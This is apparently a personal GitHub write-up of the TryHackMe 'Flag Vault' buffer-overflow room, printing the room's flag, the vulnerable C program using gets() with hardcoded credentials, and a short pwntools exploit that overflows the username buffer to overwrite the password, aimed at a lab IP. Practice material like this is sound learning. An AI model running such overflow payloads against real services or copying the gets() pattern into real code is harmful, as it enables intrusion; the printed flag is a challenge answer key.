<h1 align="center">Flag Vault</h1>
<p align="center"><img width="90px" src="https://github.com/user-attachments/assets/2e72733c-cd92-4538-b4c0-84c751d46db1"><br>Jun 4, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br> part of my 394-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
Understand the basics of buffer overflows.<br>Access it clicking <a href="https://tryhackme.com/room/hfb1flagvault"</a>here.<br><br>
<img width="1000px" src="https://github.com/user-attachments/assets/966ff32d-d2b0-4a50-bf73-5349b6335f40"></p>

<br>
<h2>Task 1 . Binay Exploitation - Flag Vault</h2>
<p> [ ... ] </p>

<h3 align="left">Answer the question below</h3>

> 1.1. <em>What is the flag?</em><br><a id='1.1'></a>
>> <strong><code>THM{password_0v3rfl0w}</code></strong><br>
<p></p>

<h3>pwnc1.c</h3>
<p>- Downloaded <code>pwn1.c</code>.</p>

![image](https://github.com/user-attachments/assets/264440c0-8561-45a4-98a4-0d9423d71df7)

<br>

![image](https://github.com/user-attachments/assets/f0b521db-8bad-4ab3-a4f1-78d20a62333a)



<h3> Format String Injection</h3>

```bash
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 1.0 - Passwordless authentication evolved!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(){
	FILE *f = fopen("flag.txt","r");
	char flag[200];

	fgets(flag, 199, f);
	printf("%s", flag);
}

void login(){
	char password[100] = "";
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// If I disable the password, nobody will get in.
	//printf("Password: ");
	//gets(password);

	if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
		print_flag();
	}
	else{
		printf("Wrong password! No flag for you.");
	}
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

<br>

<h3>exploit.py</h3>

```bash
from pwn import *

conn = remote('10.10.172.152', 1337)
payload = b"bytereaper\x00" + b"A" * 101 + b"5up3rP4zz123Byte"
conn.recvuntil(b"Username:")
conn.sendline(payload)
print(conn.recvall().decode())
```


![image](https://github.com/user-attachments/assets/bc0a0f4d-405b-4491-ab41-1464ce719e61)


<br>
<br>

<h1 align="center">Room Completed</h1>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/d9a7aaac-24fc-4b0e-b239-0b6c6890f3a2"><br>
                   <img width="1000px" src="https://github.com/user-attachments/assets/01793fce-bd28-4b74-9dfb-9c50e3135446"></p>
                   
<h1 align="center">My TryHackMe Journey</h1>


<div align="center">

| Date<br>          |  Streak<br>|   All Time<br>Global   |   All Time<br>Brazil |  Monthly<br>Global   |  Monthly<br>Brazil   |  SHOGUN<br>points  |   Rooms<br>completed  |  Badges<br> |
| :---------------: | :--------: | :--------------------: | :------------------: | :------------------: | :------------------: | :----------------: | :-------------------: | :---------: |
| Jun 4, 2025       |     394    |          200ᵗʰ         |            4ᵗʰ       |       3,295ᵗʰ        |           8ᵗʰ        |       106,181      |             764       |    62       |

</div>

<p align="center"> Global All Time: 200ᵗʰ <br><img width="300px" src="https://github.com/user-attachments/assets/b700da0c-3dad-41ed-8563-fd31c3712712" alt="Your Image Badge"><br>
                                              <img width="1000px" src="https://github.com/user-attachments/assets/a152aaf7-3e4c-4353-bd48-913fd2b67300"><br><br>
                   Brazil All Time:   4ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/4a1cae11-2454-4490-93aa-27915ce3c788"><br><br>
                   Global monthly:  3,295ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/cb80e1c8-0436-42d8-a975-b82f0e8e98e0"><br><br>
                   Brazil monthly:   8ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/392acecb-b9eb-4407-8d67-1f4794b22c9a"><br><br></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
<br>
<h1 align="center">Thank you very much tryhackme, munra, and hadrian3689 for developinng this experience so that I could sharpen my skills!</h1>


